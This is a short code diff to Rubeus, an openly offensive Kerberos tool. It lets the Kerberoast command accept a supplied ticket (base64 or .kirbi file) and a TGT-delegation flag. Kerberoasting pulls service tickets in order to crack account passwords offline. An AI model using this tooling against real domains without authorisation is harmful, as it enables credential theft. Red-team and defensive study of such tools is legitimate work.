@@ -16,6 +16,8 @@ namespace Rubeus.Commands
             string outFile = "";
             string domain = "";
             string dc = "";
+            bool useTGTdeleg = false;
+            KRB_CRED TGT = null;
 
             if (arguments.ContainsKey("/spn"))
             {
@@ -41,6 +43,30 @@ namespace Rubeus.Commands
             {
                 outFile = arguments["/outfile"];
             }
+            if (arguments.ContainsKey("/ticket"))
+            {
+                string kirbi64 = arguments["/ticket"];
+
+                if (Helpers.IsBase64String(kirbi64))
+                {
+                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
+                    TGT = new KRB_CRED(kirbiBytes);
+                }
+                else if (System.IO.File.Exists(kirbi64))
+                {
+                    byte[] kirbiBytes = System.IO.File.ReadAllBytes(kirbi64);
+                    TGT = new KRB_CRED(kirbiBytes);
+                }
+                else
+                {
+                    Console.WriteLine("\r\n[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
+                }
+            }
+
+            if (arguments.ContainsKey("/usetgtdeleg"))
+            {
+                useTGTdeleg = true;
+            }
 
             if (arguments.ContainsKey("/creduser"))
             {
@@ -64,11 +90,11 @@ namespace Rubeus.Commands
 
                 System.Net.NetworkCredential cred = new System.Net.NetworkCredential(userName, password, domainName);
 
-                Roast.Kerberoast(spn, user, OU, domain, dc, cred, outFile);
+                Roast.Kerberoast(spn, user, OU, domain, dc, cred, outFile, TGT, useTGTdeleg);
             }
             else
             {
-                Roast.Kerberoast(spn, user, OU, domain, dc, null, outFile);
+                Roast.Kerberoast(spn, user, OU, domain, dc, null, outFile,TGT, useTGTdeleg);
             }
         }
     }
